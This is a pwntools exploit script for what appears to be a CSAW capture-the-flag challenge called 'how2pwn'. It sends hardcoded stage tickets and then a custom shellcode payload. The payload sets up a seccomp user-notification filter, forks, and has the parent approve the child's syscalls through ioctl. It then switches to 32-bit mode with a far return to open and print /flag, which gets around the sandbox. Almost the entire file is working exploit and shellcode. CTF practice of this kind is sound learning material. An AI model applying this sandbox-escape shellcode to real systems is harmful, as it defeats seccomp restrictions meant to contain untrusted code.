#!/usr/bin/python

from pwn import *
import sys

if int(sys.argv[1]) not in range(1, 5):
    print("Invalid arg!")
    exit(1)

remote_ip, port = 'how2pwn.chal.csaw.io', '6000' + sys.argv[1]
brkpts = '''
set follow-fork-mode child
b *0x000055555555566e
c
b *0xcafe185
c
'''

binary = "./bin/all/chal" + sys.argv[1]

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 2 and sys.argv[2] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 2:
    io = gdb.debug(binary, brkpts)

else:
    io = process(binary)

tickets = ["764fce03d863b5155db4af260374acc1", "8e7bd9e37e38a85551d969e29b77e1ce", "7a01505a0cfefc2f8249cb24e01a2890"]

if __name__ == "__main__":
    s(tickets[int(sys.argv[1]) - 2])
    context.arch = 'amd64'
    shellcode = f'''
    mov esp,0xcafe800
    mov rsi,0x8
    mov rbx,0x7fff000000000006
    push rbx
    mov rbx, 0x7fc0000000000006
    push rbx
    mov rbx, 0xc000003e00010015
    push rbx
    mov rbx, 0x400000020
    push rbx
    mov rbx,rsp 
    push rbx
    xor rbx,rbx 
    mov bl,0x4
    push rbx
    mov rdx,rsp 
    mov rax, 317
    mov rdi,1
    syscall

    mov r8,rax
    mov rax, 57
    syscall

    cmp rax, 0
    je child_process
    parent_process:
        xor rax,rax
    clean_req_and_resp:
        mov ecx, 0xd
        mov rdx, 0xcafec00
    loop:
        mov qword ptr [rdx],rax
        dec rcx
        add dl,0x8
        cmp rcx,0
        jne loop
    recv:
        mov rax,16
        mov rdi,r8
        mov rsi, 0xc0502100
        mov rdx, 0xcafec00
        syscall

    copy_id_of_resp:
        mov rax, 0xcafec00
        mov rbx, qword ptr[rax]
        add al,0x50
        mov qword ptr[rax], rbx
    set_flags_of_resp:
        add al,0x14
        mov rbx,1
        mov dword ptr[rax], ebx
    resp:
        xor rax,rax
        mov al, 16
        mov rdi, r8
        mov esi, 0xc0182101
        mov edx, 0xcafec50
        syscall
        jmp parent_process

    child_process:
        mov rcx,0x100000
    wait_loop:
        dec rcx
        cmp rcx,0
        jne wait_loop
    show_flag:
        movabs rax, 0x230cafe180
        push rax
    '''
    X32_showflag = f'''
    mov eax, 0x5
    mov ebx, 0xcafe1f0
    xor ecx, ecx
    xor edx, edx
    int 0x80

    mov ecx, 0xcafe1f0
    mov ebx, eax
    mov eax, 0x3
    mov edx, 0x100
    int 0x80

    mov ebx, 1
    mov eax, 0x4
    int 0x80
    '''

    shellcode = asm(shellcode)+b'\xcb'
    context.arch = 'i386'
    context.bits = 32
    shellcode = shellcode.ljust(0x180,b'\0') + asm(X32_showflag)

    io.sendlineafter(": \n",(shellcode).ljust(0x1f0,b'\0')+b"/flag\0")

    io.interactive()
